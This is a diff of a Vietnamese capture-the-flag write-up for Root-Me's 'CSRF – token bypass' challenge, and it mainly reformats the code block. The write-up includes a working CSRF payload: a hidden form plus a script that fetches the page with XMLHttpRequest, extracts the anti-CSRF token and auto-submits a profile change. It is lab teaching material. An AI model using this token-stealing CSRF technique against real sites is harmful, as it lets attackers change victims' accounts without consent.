@@ -1,6 +1,4 @@
-# WRITE UP
-
-**Challenge:** [CSRF – token bypass](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)
+# [CSRF – token bypass](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)
 
 Nhìn qua, ta thấy website này có các chức năng tương tự bài CSRF 0 protection. Tuy vậy, ta có thể phát hiện được ở tab Contact, có một thẻ input bị hidden có name là token:
 
@@ -12,19 +10,20 @@ Giá trị token này sẽ thay đổi liên tục khi ta thực hiện submit f
 
 Điều này sẽ được xác thực bởi server. Từ đó, ta cần trộm token này trước khi submit form như bài CSRF 0 protection. Ta có thể sử dụng Ajax và XMLHttpRequest() để có thể get được value này.
 
-&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data"&gt;
+```html
+<form id="clickme" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
 
-&lt;input type="text" name="username" value="19522445"&gt;
+<input type="text" name="username" value="19522445">
 
-&lt;input type="checkbox" name="status" checked&gt;
+<input type="checkbox" name="status" checked>
 
-&lt;input id="token" type="hidden" name="token" value=""/&gt;
+<input id="token" type="hidden" name="token" value=""/>
 
-&lt;button type="submit"&gt;Submit&lt;/button&gt;
+<button type="submit">Submit</button>
 
-&lt;/form&gt;
+</form>
 
-&lt;script&gt;
+<script>
 
 var req = new XMLHttpRequest();
 
@@ -40,7 +39,8 @@ document.getElementById("token").value = token;
 
 document.getElementById("clickme").submit();
 
-&lt;/script&gt;
+</script>
+```
 
 <img src="./media/image3.png" style="width:6.5in;height:2.19444in" alt="Graphical user interface, text, application Description automatically generated" />
 
